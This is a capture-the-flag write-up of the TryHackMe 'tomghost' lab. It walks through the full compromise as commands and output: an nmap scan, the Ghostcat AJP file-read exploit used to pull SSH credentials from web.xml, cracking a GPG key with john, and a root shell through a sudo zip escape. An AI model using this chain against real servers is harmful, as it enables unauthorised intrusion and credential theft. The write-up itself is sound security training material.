---
published: true
---
![Desktop View](/assets/img/sample/tomghost/1.png)

Hello guys. This is [tomghost](https://tryhackme.com/room/tomghost) machine from [tryhackme](https://tryhackme.com)

# [](#header-2)Nmap Scan

```
# Nmap 7.80 scan initiated Fri Jun 26 04:00:00 2020 as: nmap -A -sC -sV -oN nmap 10.10.49.184
Nmap scan report for 10.10.49.184
Host is up (0.29s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.16 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Android 4.1.1 (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   304.58 ms 10.8.0.1
2   305.43 ms 10.10.49.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 26 04:00:31 2020 -- 1 IP address (1 host up) scanned in 31.10 seconds

```
Web in port 8080

# [](header-2)Web

![Desktop View](/assets/img/sample/tomghost/2.png)

Ajp is in port 8009 , I saw exploit in github [Exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

Download and run it

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py 

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    
usage: ajpShooter.py [-h] [--ajp-ip AJP_IP] [-H HEADER] [-X {GET,POST,HEAD,OPTIONS,PROPFIND}] [-d DATA] [-o OUT_FILE] [--debug] url ajp_port target_file {read,eval}
ajpShooter.py: error: the following arguments are required: url, ajp_port, target_file, shooter
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost/Ghostcat-CNVD-2020-10487# 

```

Let's check web.xml 

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://10.10.122.221:8080 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:87302********salks
  </description>

</web-app>
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost/Ghostcat-CNVD-2020-10487# 

```
we got username and password for ssh

```
<display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:87302********salks
  </description>
```

Let's login

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost# ssh skyfuck@10.10.122.221

The authenticity of host '10.10.122.221 (10.10.122.221)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.10.122.221' (ECDSA) to the list of known hosts.
skyfuck@10.10.122.221's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 

```
now we're in :)

# [](#header-2)Privilege Escalation

Type `ls` command you'll see two file. It's need to be decryption

Let's copy it to our local machine `scp skyfuck@10.10.122.221:/home/skyfuck/* .`

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost# scp skyfuck@10.10.122.221:/home/skyfuck/* .
skyfuck@10.10.122.221's password: 
credential.pgp                                                                                                                       100%  394     1.3KB/s   00:00    
tryhackme.asc                                                                                                                        100% 5144    15.8KB/s   00:00    
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost#

```

`/usr/sbin/gpg2john tryhackme.asc`

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost# /usr/sbin/gpg2john tryhackme.asc

File tryhackme.asc
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

```

Save it with `hash` name `/usr/sbin/gpg2john tryhackme.asc > hash`

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost# /usr/sbin/gpg2john tryhackme.asc > hash

File tryhackme.asc
```

And then Let's crack with john `john --wordlist=/opt/rockyou.txt hash`

```
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost# john --wordlist=/opt/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
No password hashes left to crack (see FAQ)
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost# john hash --show 
tryhackme:al*****ru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

1 password hash cracked, 0 left
root@cyb3rhoL1c:~/Desktop/TryHackMe/Tomghost#
```
Now we got password and let's decrypt `credential.pgp` file 

First you need to import `tryhackme.asc` file in gpg

`gpg --import tryhackme.asc`

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
skyfuck@ubuntu:~$
```

Decrypt it with this command `gpg --decrypt credential.pgp` and enter the password

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyus************************************j3kj123jskyfuck@ubuntu:~$ 
```

Now we got user merlin's password , Let's switch it

```
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ cd
merlin@ubuntu:~$ cat user.txt
THM{Ghost*******r4sy}
merlin@ubuntu:~$ 

```

Type `sudo -l`

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$
```

You can search in [GTFObin](https://gtfobins.github.io/gtfobins/zip/#sudo)

```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# ls
user.txt
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{Z1******KE}
# 

```

Now we got root flag. That's it :)

Sorry for Bad English

[Enjoy :)]()
